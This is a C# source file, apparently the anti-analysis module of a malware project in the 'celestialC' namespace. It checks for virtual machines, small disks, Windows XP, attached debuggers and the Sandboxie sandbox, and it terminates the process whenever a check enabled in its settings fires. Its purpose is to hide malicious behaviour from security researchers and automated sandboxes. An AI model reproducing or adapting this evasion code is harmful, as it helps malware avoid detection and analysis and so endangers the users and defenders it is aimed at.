using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;
using celestialC.Helper.Information;
using celestialC.Native;

namespace celestialC.Helper
{
    class Anti_Analysis
    {

        public static void RunAntiAnalysis()
        {
            if (isVirtualMachine() && Convert.ToBoolean(Settings.DetectVirtualization))
                Environment.FailFast(null);
            if (IsSmallDisk() && Convert.ToBoolean(Settings.DetectSmallDisk))
                Environment.FailFast(null);
            if (IsXP() && Convert.ToBoolean(Settings.DetectXP))
                Environment.FailFast(null);
            if (DetectDebugger() && Convert.ToBoolean(Settings.DetectDebugger))
                Environment.FailFast(null);
            if (DetectSandboxie() && Convert.ToBoolean(Settings.DetectSandboxie))
                Environment.FailFast(null);
        }

        public static bool isVirtualMachine()
        {
            const string MICROSOFTCORPORATION = "microsoft corporation";
            const string VIRTUAL = "virtual";

            foreach (var item in new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
            {
                string manufacturer = item["Manufacturer"].ToString().ToLower();
                if (manufacturer.Contains(MICROSOFTCORPORATION) || manufacturer.Contains(VIRTUAL))
                {
                    return true;
                }

                if (item["Model"] != null)
                {
                    string model = item["Model"].ToString().ToLower();
                    if (model.Contains(MICROSOFTCORPORATION) || model.Contains(VIRTUAL))
                    {
                        return true;
                    }
                }
            }

            if (ComputerInfo.GetGPU().ToLower().Contains("basic")) return true;

            SelectQuery selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
            int i = 0;
            foreach (ManagementObject DeviceID in searcher.Get())
                i++;
            if (i < 2) return true;

            return false;
        }

        private static bool IsSmallDisk()
        {
            try
            {
                long GB_60 = 61000000000;
                if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= GB_60)
                    return true;
            }
            catch { }
            return false;
        }

        private static bool IsXP()
        {
            try
            {
                if (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp"))
                {
                    return true;
                }
            }
            catch { }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            try
            {
                NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            {
                return isDebuggerPresent;
            }
        }

        private static bool DetectSandboxie()
        {
            try
            {
                if (NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                    return true;
                else
                    return false;
            }
            catch
            {
                return false;
            }
        }

    }
}
